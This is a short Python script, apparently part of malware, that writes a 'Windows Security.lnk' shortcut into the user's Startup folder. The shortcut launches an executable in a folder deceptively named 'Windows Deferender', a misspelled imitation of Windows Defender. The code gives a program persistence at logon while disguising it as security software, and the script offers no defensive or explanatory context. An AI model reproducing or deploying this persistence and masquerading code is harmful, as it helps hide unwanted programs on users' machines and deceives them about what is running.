import os
from win32com.client import Dispatch

path = os.path.join(f"C:\\Users\\{os.getenv('UserName')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows Security.lnk")
#C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
print(path)
target = r"C:\\ProgramData\\Windows Deferender\\Windows Deferender.exe"
wDir = r"C:\\ProgramData\\Windows Deferender"
icon = r"C:\\ProgramData\\Windows Deferender\\Windows Deferender.exe"
shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(path)
shortcut.Targetpath = target
shortcut.WorkingDirectory = wDir
shortcut.IconLocation = icon
shortcut.save()